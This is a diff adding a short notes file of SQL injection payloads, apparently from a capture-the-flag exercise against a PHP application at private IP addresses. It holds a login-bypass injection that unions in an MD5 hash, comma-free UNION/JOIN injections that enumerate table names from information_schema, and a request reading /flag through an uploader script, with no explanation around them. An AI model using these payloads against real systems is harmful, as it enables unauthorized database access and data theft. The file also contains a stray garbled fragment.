@@ -1,0 +1,14 @@
+user: 1' union select "c4ca4238a0b923820dcc509a6f75849b"  #
+
+password:1
+
+
+http://192.168.43.98/meituan/sblist.php?u=1') or 0 union select * from ((select 1)a JoIN (select 2)b JoIN (select 3)c JoIN (select 4)d JoIN (select 5)e JoIN (select 5)f JoIN (select 5)g JoIN (select 5)h  )--+
+
+http://192.168.43.98/meituan/sblist.php?u=1') or 0 union select * from ((select 1)a JoIN (select group_concat(table ) )b JoIN (select 3)c JoIN (select 4)d JoIN (select 5)e JoIN (select 6)f JoIN (select 7)g JoIN (select 8)h  )--+
+
+”√in
+http://192.168.43.233/meituan/www/sblist.php?u=1%27)%20or%200%20union%20select%20*%20from%20((select%201)a%20JoIN%20(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema%20in%20(database()))b%20JoIN%20(select%203)c%20JoIN%20(select%204)d%20JoIN%20(select%205)e%20JoIN%20(select%206)f%20JoIN%20(select%207)g%20JoIN%20(select%208)h%20%20)--+
+
+
+http://192.168.43.98/meituan/www/956c110ef9decdd920249f5fed9e4427/lib/webuploader/0.1.5/server/e98a4571cf72b798077d12d6c94629.php?file=/flag
